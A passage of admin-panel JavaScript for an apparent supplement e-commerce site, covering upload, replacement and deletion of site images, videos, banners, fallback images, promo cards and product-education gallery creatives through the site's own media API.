  { group:'About Page',  key:'about.manufacturing_photo', label:'Manufacturing Photo',     hint:'About page hero well — "Our plant in Anand — photo coming soon" placeholder until uploaded',
    fallback:'' },
];

// ── Aug 2026: PRODUCT EDUCATION GALLERY ──────────────────────────
// The "Know Your Product" gallery on the product page (How To Use / What
// Experts Say / What Research Says / Why Ozylix) has 16 creative slots —
// 4 cards in each of the 4 tabs. Keys are edu.{slug}.{panel}.{n}.
const EDU_PANELS = [
  { id:'howto',    label:'How To Use' },
  { id:'experts',  label:'What Experts Say' },
  { id:'research', label:'What Research Says' },
  { id:'why',      label:'Why Ozylix' }
];
const EDU_CARDS = 4; // cards per panel
// The product whose gallery these creatives belong to — the slug comes from
// the product name on the live site (e.g. "glutathione-effervescent-tablet").
let EDU_SLUG = (localStorage.getItem('ozylix.eduSlug') || '').trim();

async function loadSiteImages() {
  let overrides = {};
  try {
    const r = await apiFetch('/api/admin/site-media');
    const d = await r.json();
    (d.data || []).forEach(row => { overrides[row.key] = row.url; });
  } catch(e) { console.error('loadSiteImages error:', e); }

  const groups = {};
  SITE_IMAGE_CATALOG.forEach(item => { (groups[item.group] = groups[item.group]||[]).push(item); });

  // The old tab/search/sort toolbar was removed: uploaders now see every
  // slot in the same order as the storefront flow, with its page location
  // and slot key printed on the card itself.
  window.__siteImgState = { tab:'all', overrides: overrides };

  document.getElementById('siteImagesGroups').innerHTML = renderSiteImgSections(groups, overrides);
  loadEduSection();
}

let __siteTabActive = 'all';
function setSiteTab(tab, el){
  __siteTabActive = tab;
  document.querySelectorAll('.media-tab[data-sitab]').forEach(t => t.classList.toggle('active', t.dataset.sitab === tab));
  filterSiteImages();
}

function renderSiteImgSections(groups, overrides){
  const state = window.__siteImgState || {};
  const q = ((document.getElementById('siteImgSearch')||{}).value||'').trim().toLowerCase();
  const sortBy = ((document.getElementById('siteImgSort')||{}).value||'group');
  const secNames = Object.keys(groups);
  return secNames.map(groupName => {
    let items = groups[groupName].slice();
    if (sortBy === 'custom') items.sort((a,b)=> (overrides[b.key]?1:0) - (overrides[a.key]?1:0));
    if (sortBy === 'name') items.sort((a,b)=> a.label.localeCompare(b.label));
    if (q) items = items.filter(it => (it.label+' '+it.hint+' '+it.key+' '+groupName).toLowerCase().includes(q));
    if (!items.length && q) return '';
    if (__siteTabActive !== 'all' && __siteTabActive !== groupName.toLowerCase().replace(/[^a-z0-9]/g,'')) return '';
    const nCustom = items.filter(it => !!overrides[it.key]).length;
    return `<div class="siteimg-sec" data-sec="${groupName.toLowerCase()}">
      <div class="siteimg-sec-title">
        <div class="siteimg-sec-name">${groupName==='Global'?'🌐':groupName==='About Page'?'📄':'📁'} ${groupName}</div>
        <div class="siteimg-sec-count">${nCustom}/${items.length} custom</div>
      </div>
      <div class="siteimg-grid">
        ${items.map(item => {
          const current = overrides[item.key] || item.fallback;
          const isOverridden = !!overrides[item.key];
          const empty = !current;
          return `
          <div class="siteimg-card">
            ${isVideoFileUrl(current)
              ? '<video src="'+adminCdnImg(current)+'" muted loop playsinline preload="metadata" autoplay class="si-media" style="object-fit:cover;"></video><span class="siteimg-badge">▶ VIDEO</span>'
              : empty
                ? '<div class="si-media-empty">No image</div>'
                : '<img src="'+adminCdnImg(current)+'" class="si-media" onerror="this.style.display=\'none\';this.parentElement.querySelector(\'.si-media-empty\')&&(this.parentElement.querySelector(\'.si-media-empty\').style.display=\'flex\')"><div class="si-media-empty" style="display:none;">No image</div>'}
            <div class="si-meta">
              <div class="si-name">${item.label}</div>
              <div class="si-hint"><span class="si-where">Appears on: ${item.hint}</span><span class="si-key">Slot: ${item.key}</span><span class="si-status" style="color:${isOverridden?'var(--green-text)':'var(--text3)'};">${isOverridden?'✓ custom image set':'· using site default'}</span></div>
            </div>
            <div class="si-actions">
              <input type="file" accept="image/*,.svg,video/*,.mp4,.webm,.mov" id="siteImgFile-${item.key}" style="display:none;" onchange="uploadSiteImage(this, '${item.key}')">
              <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('siteImgFile-${item.key}').click()">📤 ${isOverridden ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
              ${isOverridden ? `<button class="btn btn-danger btn-sm btn-icon" onclick="resetSiteImage('${item.key}', '${current}')" title="Delete this image everywhere and revert to default">🗑️</button>` : ''}
            </div>
          </div>`;
        }).join('')}
      </div>
    </div>`;
  }).join('');
}

function filterSiteImages(){
  const root = document.getElementById('siteImagesGroups');
  if (!root || !root.querySelector('.siteimg-sec')) return;
  const q = ((document.getElementById('siteImgSearch')||{}).value||'').trim().toLowerCase();
  root.querySelectorAll('.siteimg-sec').forEach(sec => {
    const name = (sec.dataset.sec || '');
    const visible = (__siteTabActive === 'all' || __siteTabActive === name);
    if (!visible) { sec.style.display = 'none'; return; }
    if (!q) { sec.style.display = ''; sec.querySelectorAll('.siteimg-card').forEach(c => c.style.display = ''); return; }
    // Search applies per-card across both the catalog sections and the edu gallery
    sec.style.display = '';
    sec.querySelectorAll('.siteimg-card').forEach(card => {
      const txt = (card.textContent || '').toLowerCase();
      card.style.display = txt.includes(q) ? '' : 'none';
    });
    // Hide an empty section so there are no orphan headers under a search
    sec.style.display = sec.querySelector('.siteimg-card:not([style*="display: none"])') ? '' : 'none';
  });
  // Product Gallery tab visibility
  const edu = root.querySelector('#siteimgEdu');
  if (edu) edu.style.display = (__siteTabActive === 'edu') ? '' : 'none';
}

// ── Product Education Gallery (Know Your Product tabs) ─────────────
const __eduHtml = function(overrides){
  return `
    <div class="siteimg-sec" id="siteimgEdu" style="display:block;">
      <div class="siteimg-sec-title">
        <div class="siteimg-sec-name">🎓 Product Gallery — "Know Your Product" cards</div>
        <div class="siteimg-sec-count">${EDU_CARDS * EDU_PANELS.length} slots</div>
      </div>
      <div style="font-size:0.75rem;color:var(--text3);margin-bottom:12px;max-width:640px;">The 16 creatives on the product page's Know Your Product tabs (How To Use / What Experts Say / What Research Says / Why Ozylix — 4 cards each). <b style="color:var(--text);">Default set below applies to every product without its own uploads</b> — fill this first (e.g. with the Glutathione creatives), then optionally override individual products by slug. Videos are accepted too — they autoplay silently on the site.</div>
      <div style="font-size:0.78rem;font-weight:700;color:var(--green-text);margin:4px 0 8px;">🌐 Default creatives — shown on all products that don't have their own set</div>
      ${EDU_PANELS.map(pl => `
        <div style="font-size:0.75rem;font-weight:700;color:var(--text2);margin:12px 0 8px;">${pl.label}</div>
        <div class="siteimg-grid siteimg-grid-full">
          ${Array.from({length: EDU_CARDS}, (_, i) => {
            const key = 'edu.global.' + pl.id + '.' + (i + 1);
            const url = overrides[key] || '';
            const has = !!url;
            return `<div class="siteimg-card">
              ${has ? (isVideoFileUrl(url)
                ? '<video src="'+adminCdnImg(url)+'" muted loop playsinline preload="metadata" autoplay class="si-media" style="object-fit:cover;"></video><span class="siteimg-badge">▶ VIDEO</span>'
                : '<img src="'+adminCdnImg(url)+'" class="si-media" onerror="this.style.display=\'none\'"><div class="si-media-empty" style="display:none;">No image</div>')
                : '<div class="si-media-empty">No image</div>'}
              <div class="si-meta">
                <div class="si-name">${pl.label} — Card ${i + 1}</div>
                <div class="si-hint"><span class="si-where">Appears on: every product page → Know Your Product → ${pl.label}</span><span class="si-key">Slot: ${key}</span><span class="si-status" style="color:var(--green-text);font-weight:600;">${has ? '✓ default creative set' : 'empty — upload a creative'}</span></div>
              </div>
              <div class="si-actions">
                <input type="file" accept="image/*,.svg,video/*,.mp4,.webm,.mov" id="eduFile-${key}" style="display:none;" onchange="uploadEduCreative(this, '${key}')">
                <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('eduFile-${key}').click()">📤 ${has ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
                ${has ? `<button class="btn btn-danger btn-sm btn-icon" onclick="deleteEduCreative('${key}', '${url}')" title="Delete this creative">🗑️</button>` : ''}
              </div>
            </div>`;
          }).join('')}
        </div>`).join('')}
      <div style="font-size:0.78rem;font-weight:700;color:var(--text2);margin:18px 0 8px;">⚙️ Per-product overrides (optional)</div>
      <div style="display:flex;gap:8px;align-items:center;margin-bottom:14px;flex-wrap:wrap;">
        <label style="font-size:0.78rem;color:var(--text2);font-weight:600;">Product slug:</label>
        <input id="eduSlugInput" value="${EDU_SLUG}" placeholder="e.g. glutathione-effervescent-tablet" style="flex:1;min-width:220px;padding:8px 12px;border:1px solid var(--border);border-radius:8px;background:var(--surface);color:var(--text);">
        <button class="btn btn-primary btn-sm" onclick="saveEduSlug(document.getElementById('eduSlugInput').value)">Save</button>
      </div>
      ${!EDU_SLUG ? '<div style="font-size:0.75rem;color:var(--text3);margin-bottom:14px;">Enter the slug above to see the 16 per-product slots.</div>' :
      EDU_PANELS.map(pl => `
        <div style="font-size:0.75rem;font-weight:700;color:var(--text2);margin:12px 0 8px;">${pl.label}</div>
        <div class="siteimg-grid siteimg-grid-full">
          ${Array.from({length: EDU_CARDS}, (_, i) => {
            const key = 'edu.' + EDU_SLUG + '.' + pl.id + '.' + (i + 1);
            const url = overrides[key] || '';
            const has = !!url;
            return `<div class="siteimg-card">
              ${has ? (isVideoFileUrl(url)
                ? '<video src="'+adminCdnImg(url)+'" muted loop playsinline preload="metadata" autoplay class="si-media" style="object-fit:cover;"></video><span class="siteimg-badge">▶ VIDEO</span>'
                : '<img src="'+adminCdnImg(url)+'" class="si-media" onerror="this.style.display=\'none\'"><div class="si-media-empty" style="display:none;">No image</div>')
                : '<div class="si-media-empty">No image</div>'}
              <div class="si-meta">
                <div class="si-name">${pl.label} — Card ${i + 1}</div>
                <div class="si-hint"><span class="si-where">Appears on: ${EDU_SLUG} product page → Know Your Product → ${pl.label}</span><span class="si-key">Slot: ${key}</span><span class="si-status" style="color:${has?'var(--green-text)':'var(--text3)'};">${has ? (key.startsWith('edu.global.') ? '✓ default creative set' : '✓ custom creative set') : 'empty — upload a creative'}</span></div>
              </div>
              <div class="si-actions">
                <input type="file" accept="image/*,.svg,video/*,.mp4,.webm,.mov" id="eduFile-${key}" style="display:none;" onchange="uploadEduCreative(this, '${key}')">
                <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('eduFile-${key}').click()">📤 ${has ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
                ${has ? `<button class="btn btn-danger btn-sm btn-icon" onclick="deleteEduCreative('${key}', '${url}')" title="Delete this creative">🗑️</button>` : ''}
              </div>
            </div>`;
          }).join('')}
        </div>`).join('')}
    </div>`;
};
function loadEduSection(){
  const root = document.getElementById('siteImagesGroups');
  if (!root) return;
  const state = window.__siteImgState;
  const existing = root.querySelector('#siteimgEdu');
  const html = __eduHtml(state ? state.overrides : {});
  if (existing) { existing.outerHTML = html; }
  else { root.insertAdjacentHTML('beforeend', html); }
}

async function uploadSiteImage(input, key) {
  const file = input.files[0]; if(!file) return;
  const _mb = file.size / (1024 * 1024);
  if (_mb > 50) { toast('❌ Video is ' + _mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error'); input.value=''; return; }
  if (file.type.startsWith('video/')) toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  const fd = new FormData(); fd.append('image', file);
  let d = null, r = null;
  try {
    // File uploads (especially phone videos on mobile data) are the most
    // flaky step — a dropped packet used to fail the whole flow with a
    // bare "Upload failed". Retry up to twice, waiting a moment between
    // attempts, so a transient network hiccup can never look like a bug.
    for (let attempt = 0; attempt < 3; attempt++) {
      try {
        r = await adminProofUpload('/api/upload/image', fd, 'Authorize this image / video upload?');
        d = await r.json();
        if (r.ok) break;
      } catch (e) {
        if (attempt === 2) throw e;
        await new Promise(res => setTimeout(res, 1500 * (attempt + 1)));
      }
    }
    if(!r.ok) {
      const msg = (d.error||'').toLowerCase();
      if(msg.includes('bucket') || msg.includes('storage') || msg.includes('not found')) {
        toast('❌ Storage bucket not found. Go to Supabase → Storage → Create bucket named "product-images" (public).', 'error');
      } else {
        toast('❌ Upload failed: ' + (d.error || 'the server refused the file'), 'error');
      }
      return;
    }
    const url = d.url || d.public_url || '';
    if (!url) { toast('❌ Upload failed — the server returned no file URL', 'error'); return; }
    const put = await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, {method:'PUT', body:JSON.stringify({url})});
    if (!put.ok) { toast('❌ Saved the video but could not link it to the site — tap Refresh and try again', 'error'); return; }
    toast('✅ Media uploaded — live on the site now');
    loadSiteImages();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
}

async function resetSiteImage(key, currentUrl) {
  if(!confirm('Delete this image from storage (removing it everywhere it\'s used) and revert this slot to the site\'s default? This can\'t be undone.')) return;
  try {
    if (currentUrl) {
      const filename = currentUrl.split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, {method:'DELETE'}).catch(()=>{});
    }
    // Belt-and-suspenders: also clear the override row directly in case the file
    // wasn't one of ours (e.g. an old pasted link the cascade delete couldn't match).
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, {method:'DELETE'}).catch(()=>{});
    toast('🗑️ Deleted — reverted to default');
    loadSiteImages();
    } catch(e) { toast(e.message,'error'); }
}

async function uploadEduCreative(input, key) {
  const file = input.files[0]; if(!file) return;
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this product-education creative upload?');
    const d = await r.json();
    if(!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, {method:'PUT', body:JSON.stringify({url})});
    toast('✅ Image / video uploaded — appears on the product page now');
    loadSiteImages();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
  input.value = '';
}

async function deleteEduCreative(key, url) {
  if(!confirm('Delete this creative from storage and remove it from the product page? This can\'t be undone.')) return;
  try {
    if (url) {
      const filename = url.split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, {method:'DELETE'}).catch(()=>{});
    }
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, {method:'DELETE'}).catch(()=>{});
    toast('🗑️ Creative deleted — card now shows its default state');
    loadSiteImages();
  } catch(e) { toast(e.message,'error'); }
}

function saveEduSlug(slug) {
  EDU_SLUG = (slug || '').trim().toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '');
  localStorage.setItem('ozylix.eduSlug', EDU_SLUG);
  toast(EDU_SLUG ? ('✅ Product slug set: ' + EDU_SLUG) : 'Slug cleared');
  loadSiteImages();
}

// ═══════════════════════════════════════════════
// OFFER BANNERS (home) & SHOP BANNERS — unlimited,
// admin-managed image families (Aug 2026). Keys live
// in the site_media table: home.banner.N (+.alt/.link),
// shop.banner.N. The storefront renders everything
// with these keys at runtime, so there is no upper
// limit and nothing to edit in the code.
// ═══════════════════════════════════════════════
let _siteMediaAll = [];
async function loadBannerManagers() {
  try {
    const r = await apiFetch('/api/admin/site-media');
    const d = await r.json();
    _siteMediaAll = d.data || [];
  } catch(e) { _siteMediaAll = []; }
  renderBannerManagers();
}
function homeBanners() {
  const out = [];
  _siteMediaAll.forEach(row => {
    const m = row.key.match(/^home\.banner\.(\d+)$/);
    if (m) out.push({ n: +m[1], img: row.url, alt: (_siteMediaAll.find(x => x.key === 'home.banner.' + m[1] + '.alt') || {}).url || '', link: (_siteMediaAll.find(x => x.key === 'home.banner.' + m[1] + '.link') || {}).url || '' });
  });
  return out.sort((a, b) => a.n - b.n);
}
function shopBanners() {
  const fixed = ['1', '2', 'mix_match'];
  const out = [];
  _siteMediaAll.forEach(row => {
    const m = row.key.match(/^shop\.banner\.(\d+)$/);
    if (m && !fixed.includes(m[1])) out.push({ n: +m[1], img: row.url });
  });
  return out.sort((a, b) => a.n - b.n);
}
function renderBannerManagers() {
  const hb = document.getElementById('homeBannerManager');
  const sb = document.getElementById('shopBannerManager');
  const cards = (banners, prefix, withMeta) => { const location = prefix === 'home.banner' ? 'Home page hero slider + Shop page hero' : 'Shop page promotion strips below the product grid'; const spec = prefix === 'home.banner' ? 'Landscape 2.33:1 · 1400×600px or 1600×686px' : 'Wide strip 11:1 · about 2200×200px'; return banners.map(b => `
    <div class="card">
      ${isVideoFileUrl(b.img)
        ? '<video src="'+adminCdnImg(b.img)+'" muted loop playsinline preload="metadata" autoplay class="banner-preview" style="object-fit:cover;"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
        : '<img src="'+adminCdnImg(b.img)+'" class="banner-preview" onerror="this.style.display=\'none\'">'}
      <div style="padding:6px 9px;">
        <div style="display:flex;align-items:center;justify-content:space-between;">
          <span style="font-size:0.72rem;font-weight:600;">${prefix === 'home.banner' ? 'Home hero' : 'Shop strip'} #${b.n}</span>
          <button class="btn btn-danger btn-sm btn-icon" style="width:24px;height:24px;font-size:0.62rem;" onclick="deleteBanner('${prefix}', ${b.n})" title="Remove this banner">🗑️</button>
        </div>
        <div class="siteimg-usage"><b>Appears on:</b> ${location}<br><span>Recommended: ${spec}</span><br><span>Slot: ${prefix}.${b.n}</span></div>
        ${withMeta ? `
        <div style="display:flex;gap:4px;margin-top:5px;">
          <input class="form-control" style="font-size:0.66rem;padding:3px 6px;min-height:22px;" placeholder="Caption" value="${escAttr(b.alt)}" onchange="setBannerMeta('${prefix}', ${b.n}, 'alt', this.value)">
          <input class="form-control" style="font-size:0.66rem;padding:3px 6px;min-height:22px;" placeholder="Link e.g. /product/glutathione-effervescent-tablet" value="${escAttr(b.link)}" onchange="setBannerMeta('${prefix}', ${b.n}, 'link', this.value)">
        </div>
        ` : ''}
        <div style="display:flex;gap:5px;margin-top:5px;">
          <input type="file" accept="image/*,.webp,.svg,video/*,.mp4,.webm,.mov" id="bannerFile-${prefix}-${b.n}" style="display:none;" onchange="uploadBannerImage('${prefix}', ${b.n}, this)">
          <button class="btn btn-primary btn-sm" style="flex:1;width:100%;font-size:0.66rem;min-height:28px;" onclick="document.getElementById('bannerFile-${prefix}-${b.n}').click()">📤 ${b.img ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
        </div>
      </div>
    </div>`).join(''); }
  hb.innerHTML = cards(homeBanners(), 'home.banner', true) || emptyMsg('No offer banners yet — upload your first one and the home-page carousel appears.');
  sb.innerHTML = cards(shopBanners(), 'shop.banner', false) || emptyMsg('Only the two built-in banners show — add extras and they appear in order underneath.');
}
function escAttr(s) { return String(s == null ? '' : s).replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;'); }
function emptyMsg(m) { return '<div class="empty-state" style="grid-column:1/-1;"><div class="empty-ico">🖼️</div><div class="empty-msg">' + m + '</div></div>'; }
// The backend refuses empty URLs, so "+ Add Banner" goes straight to
// the file picker — the slot is created the moment an image is chosen.
let _homeBannerNext = 1, _shopBannerNext = 3;
async function addHomeBanner() {
  const inp = document.createElement('input');
  inp.type = 'file'; inp.accept = 'image/*,.webp,.svg,video/*,.mp4,.webm,.mov';
  _homeBannerNext = 1;
  const used = new Set(homeBanners().map(b => b.n));
  while (used.has(_homeBannerNext)) _homeBannerNext++;
  inp.onchange = () => uploadBannerImage('home.banner', _homeBannerNext, inp);
  inp.click();
}
async function addShopBanner() {
  const inp = document.createElement('input');
  inp.type = 'file'; inp.accept = 'image/*,.webp,.svg,video/*,.mp4,.webm,.mov';
  _shopBannerNext = 3;
  const used = new Set(shopBanners().map(b => b.n));
  while (used.has(_shopBannerNext)) _shopBannerNext++;
  inp.onchange = () => uploadBannerImage('shop.banner', _shopBannerNext, inp);
  inp.click();
}
async function uploadBannerImage(prefix, n, input) {
  const file = input.files[0]; if (!file) return;
  const _mb = file.size / (1024 * 1024);
  if (_mb > 50) { toast('❌ Video is ' + _mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error'); input.value=''; return; }
  if (file.type.startsWith('video/')) toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  const key = prefix + '.' + n;
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this promo-card media upload?');
    const d = await r.json();
    if (!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'PUT', body: JSON.stringify({ url }) });
    toast('✅ ' + (file.type.startsWith('video/') ? 'Video' : 'Banner') + ' uploaded — live on the site now');
    loadBannerManagers();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
}
async function setBannerMeta(prefix, n, field, value) {
  const key = prefix + '.' + n + '.' + field;
  try {
    if (!value.trim()) {
      // empty = delete the meta key so the storefront falls back to defaults
      await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'DELETE' }).catch(() => {});
    } else {
      await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'PUT', body: JSON.stringify({ url: value.trim() }) });
    }
    toast('✅ Saved');
    loadBannerManagers();
  } catch(e) { toast('Could not save: ' + e.message, 'error'); }
}
async function deleteBanner(prefix, n) {
  const key = prefix + '.' + n;
  if (!confirm('Remove banner #' + n + ' (its image is also deleted from storage)? This can\'t be undone.')) return;
  try {
    // 1. find & delete the stored file
    const row = _siteMediaAll.find(x => x.key === key);
    if (row && row.url) {
      const filename = String(row.url).split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, { method: 'DELETE' }).catch(() => {});
    }
    // 2. delete the key + its alt/link companions
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'DELETE' }).catch(() => {});
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key + '.alt')}`, { method: 'DELETE' }).catch(() => {});
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key + '.link')}`, { method: 'DELETE' }).catch(() => {});
    toast('🗑️ Banner removed');
    loadBannerManagers();
  } catch(e) { toast('Could not delete: ' + e.message, 'error'); }
}
// ═══════════════════════════════════════════════
// PRODUCT IMAGE FALLBACKS — default image per
// category (plus an overall default) for products
// that have no photos. Keys: fallback.<category>
// and fallback.default. ═══════════════════════════
const FALLBACK_CATEGORIES = ['effervescent', 'spirulina', 'premium', 'ayurvedic', 'immunity', 'default'];
async function loadFallbackManager() {
  let overrides = {};
  try {
    const r = await apiFetch('/api/admin/site-media');
    const d = await r.json();
    (d.data || []).forEach(row => {
      const m = String(row.key).match(/^fallback\.(.+)$/);
      if (m) overrides[m[1]] = row.url;
    });
  } catch(e) { overrides = {}; }
  document.getElementById('fallbackManager').innerHTML = `
    <div class="grid-3">
      ${FALLBACK_CATEGORIES.map(cat => {
        const url = overrides[cat] || '';
        return `
        <div class="card">
          ${isVideoFileUrl(url)
            ? '<video src="'+adminCdnImg(url)+'" muted loop playsinline preload="metadata" autoplay class="banner-preview" style="object-fit:cover;"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
            : '<img src="'+adminCdnImg(url)+'" class="banner-preview" onerror="this.style.display=\'none\'">'}
          <div style="padding:6px 9px;">
            <div style="font-size:0.72rem;font-weight:600;">${cat === 'default' ? 'Default product fallback' : cat.charAt(0).toUpperCase() + cat.slice(1) + ' fallback'}</div><div class="siteimg-usage"><b>Appears on:</b> product cards in the ${cat === 'default' ? 'default / unknown' : cat} category when no product photo exists<br><span>Recommended: square 1600×1600px · Slot: fallback.${cat}</span></div>
            ${url ? '<div style="font-size:0.62rem;color:var(--green-text);">✓ custom image set</div>' : '<div style="font-size:0.62rem;color:var(--text3);">no image yet</div>'}
            <input type="file" accept="image/*,.webp,.svg,video/*,.mp4,.webm,.mov" id="fallbackFile-${cat}" style="display:none;" onchange="uploadFallbackImage('${cat}', this)">
            <div style="display:flex;gap:6px;">
              <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('fallbackFile-${cat}').click()">📤 ${url ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
              ${url ? '<button class="btn btn-danger btn-sm btn-icon" onclick="deleteFallbackImage(\'' + cat + '\')" title="Remove this fallback">🗑️</button>' : ''}
            </div>
          </div>
        </div>`;
      }).join('')}
    </div>`;
}
async function uploadFallbackImage(cat, input) {
  const file = input.files[0]; if (!file) return;
  const _mb = file.size / (1024 * 1024);
  if (_mb > 50) { toast('❌ Video is ' + _mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error'); input.value=''; return; }
  if (file.type.startsWith('video/')) toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this promo-card media upload?');
    const d = await r.json();
    if (!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch(`/api/admin/site-media/${encodeURIComponent('fallback.' + cat)}`, { method: 'PUT', body: JSON.stringify({ url }) });
    toast('✅ Fallback image set — empty product cards in "' + cat + '" use it now');
    loadFallbackManager();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
}
async function deleteFallbackImage(cat) {
  if (!confirm('Remove the fallback image for "' + cat + '" (the file is deleted from storage)?')) return;
  try {
    const r = await apiFetch('/api/admin/site-media');
    const d = await r.json();
    const row = (d.data || []).find(x => x.key === 'fallback.' + cat);
    if (row && row.url) {
      const filename = String(row.url).split('/').pop().split('?')[0];
      await apiFetch(`/api/upload/image/${encodeURIComponent(filename)}`, { method: 'DELETE' }).catch(() => {});
    }
    await apiFetch(`/api/admin/site-media/${encodeURIComponent('fallback.' + cat)}`, { method: 'DELETE' }).catch(() => {});
    toast('🗑️ Fallback removed');
    loadFallbackManager();
  } catch(e) { toast('Could not delete: ' + e.message, 'error'); }
}
// ═══════════════════════════════════════════════
// PROMO CAROUSEL — home page scrolling promo cards
// Upload-based (like home/shop banners). Slots are site-media keys
// promo.card.1 .. promo.card.10; the storefront's renderPromoCarousel()
// uses an uploaded slot in place of the automatic product photo, with
// live refresh on upload/delete via ADMIN_PROMO_CARDS.
async function loadPromoMedia() {
  try {
    const r = await apiFetch('/api/admin/site-media');
    const d = await r.json();
    _siteMediaAll = (d.data || []).concat(_siteMediaAll || []).filter((v, i, arr) => arr.findIndex(x => x.key === v.key) === i);
  } catch(e) { /* _siteMediaAll stays what it was */ }
  renderPromoMediaGrid();
}
function promoCards() {
  const out = [];
  (_siteMediaAll || []).forEach(row => {
    const m = row.key.match(/^promo\.card\.(\d+)$/);
    if (m) out.push({ n: +m[1], img: row.url, alt: ((_siteMediaAll || []).find(x => x.key === 'promo.card.' + m[1] + '.alt') || {}).url || '' });
  });
  return out.sort((a, b) => a.n - b.n);
}
function renderPromoMediaGrid() {
  const cards = promoCards().map(b => `
    <div class="card">
      ${isVideoFileUrl(b.img)
        ? '<video src="'+adminCdnImg(b.img)+'" muted loop playsinline preload="metadata" autoplay class="banner-preview" style="object-fit:cover;"></video><span class="img-slot-vid-badge">▶ VIDEO</span>'
        : '<img src="'+adminCdnImg(b.img)+'" class="banner-preview" onerror="this.style.display=\'none\'">'}
      <div style="padding:6px 9px;">
        <div style="display:flex;align-items:center;justify-content:space-between;">
          <span style="font-size:0.72rem;font-weight:600;">Home promo card #${b.n}</span>
          <button class="btn btn-danger btn-sm btn-icon" style="width:24px;height:24px;font-size:0.62rem;" onclick="deletePromoCard(${b.n})" title="Remove this card">🗑️</button>
        </div>
        <div class="siteimg-usage"><b>Appears on:</b> homepage promo carousel between product sections<br><span>Recommended: square 1400×1400px · Slot: promo.card.${b.n}</span></div>
        <input class="form-control" style="font-size:0.66rem;padding:3px 6px;min-height:22px;margin-top:5px;" placeholder="Caption (optional)" value="${escAttr(b.alt)}" onchange="setPromoCardAlt(${b.n}, this.value)">
        <div style="margin-top:5px;">
          <input type="file" accept="image/*,.webp,.svg,video/*,.mp4,.webm,.mov" id="promoFile-${b.n}" style="display:none;" onchange="uploadPromoCardImage(${b.n}, this)">
          <button class="btn btn-primary btn-sm" style="flex:1;" onclick="document.getElementById('promoFile-${b.n}').click()">📤 ${b.img ? 'Replace Image / Video' : 'Upload Image / Video'}</button>
        </div>
      </div>
    </div>`).join('');
  document.getElementById('promoMediaGrid').innerHTML = cards || emptyMsg('No promo cards yet — add one and it takes carousel position #1; positions fill in upload order.');
}
async function addPromoCard() {
  // Slots fill in order — the first empty slot between 1 and 10 is chosen.
  const used = new Set(promoCards().map(b => b.n));
  let n = 1;
  while (n <= 10 && used.has(n)) n++;
  if (n > 10) { toast('All 10 promo card slots are filled — remove one first', 'error'); return; }
  const inp = document.createElement('input');
  inp.type = 'file'; inp.accept = 'image/*,.webp,.svg,video/*,.mp4,.webm,.mov';
  inp.onchange = () => uploadPromoCardImage(n, inp);
  inp.click();
}
async function uploadPromoCardImage(n, input) {
  const file = input.files[0]; if (!file) return;
  const _mb = file.size / (1024 * 1024);
  if (_mb > 50) { toast('❌ Video is ' + _mb.toFixed(0) + ' MB — too large. Keep videos under 50 MB (compress on your phone first).', 'error'); input.value=''; return; }
  if (file.type.startsWith('video/')) toast('⏳ Uploading video — the server is compressing it to web size, this can take up to a minute…');
  const key = 'promo.card.' + n;
  const fd = new FormData(); fd.append('image', file);
  try {
    const r = await adminProofUpload('/api/upload/image', fd, 'Authorize this promo-card media upload?');
    const d = await r.json();
    if (!r.ok) { toast(d.error || 'Upload failed', 'error'); return; }
    const url = d.url || d.public_url || '';
    await apiFetch(`/api/admin/site-media/${encodeURIComponent(key)}`, { method: 'PUT', body: JSON.stringify({ url }) });
    toast('✅ ' + (file.type.startsWith('video/') ? 'Video' : 'Image') + ' uploaded — live on the home page now');
    loadBannerManagers(); loadPromoMedia();
  } catch(e) { toast('Upload error: ' + e.message, 'error'); }
}
async function setPromoCardAlt(n, value) {
